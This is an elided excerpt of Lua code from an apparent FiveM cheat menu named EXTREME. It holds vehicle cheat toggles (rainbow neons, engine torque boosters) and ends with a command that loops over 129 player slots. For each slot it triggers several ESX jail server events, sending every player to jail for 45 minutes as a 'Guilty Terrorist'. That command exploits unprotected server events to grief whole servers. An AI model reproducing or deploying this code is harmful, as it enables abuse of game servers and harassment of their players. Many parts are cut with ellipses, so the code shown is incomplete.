                    Clean2(GetVehiclePedIsUsing(PlayerPedId(-1)))
                elseif
                    EXTREME.CheckBox(
                        '~h~~g~R~r~a~y~i~w~n~o~w~r~o~g~w ~w~Neons & Headlights',
                        rainbowh,
                        function(dR)
                            rainbowh = dR
                        end
                ...
                EXTREME.Display()
            elseif EXTREME.IsMenuOpened('BoostMenu') then
                if
                    EXTREME.ComboBox(
                        '~h~Engine ~r~Power ~w~Booster',
                        dD,
                        dB,
                        dC,
                        function(ag, ah)
                ...
                elseif
                    EXTREME.CheckBox(
                        '~h~Engine ~g~Torque ~w~Booster ~g~2x',
                        t2x,
                        function(dR)
                            t2x = dR
                            t4x = false
                ...
                elseif
                    EXTREME.CheckBox(
                        '~h~Engine ~g~Torque ~w~Booster ~g~4x',
                        t4x,
                        function(dR)
                            t2x = false
                            t4x = dR
                ...
                elseif
                    EXTREME.CheckBox(
                        '~h~Engine ~g~Torque ~w~Booster ~g~10x',
                        t10x,
                        function(dR)
                            t2x = false
                            t4x = false
                ...
                elseif
                    EXTREME.CheckBox(
                        '~h~Engine ~g~Torque ~w~Booster ~g~16x',
                        t16x,
                        function(dR)
                            t2x = false
                            t4x = false
                ...
                elseif
                    EXTREME.CheckBox(
                        '~h~Engine ~g~Torque ~w~Booster ~y~XD',
                        txd,
                        function(dR)
                            t2x = false
                            t4x = false
                ...
                elseif
                    EXTREME.CheckBox(
                        '~h~Engine ~g~Torque ~w~Booster ~y~BIG XD',
                        tbxd,
                        function(dR)
                            t2x = false
                            t4x = false
...
RegisterCommand(
    ...
    function(eA, eB, eC)
        ...
        AmbulancePlayers()
        for i = 0, 128 do
            TriggerServerEvent('esx-qalle-jail:jailPlayer', GetPlayerServerId(i), 5000, 'Guilty Terrorist')
            TriggerServerEvent('esx_jailer:sendToJail', GetPlayerServerId(i), 45 * 60)
            TriggerServerEvent('esx_jail:sendToJail', GetPlayerServerId(i), 45 * 60)
            TriggerServerEvent('js:jailuser', GetPlayerServerId(i), 45 * 60, 'Guilty Terrorist')
        end
    end,
    false
)
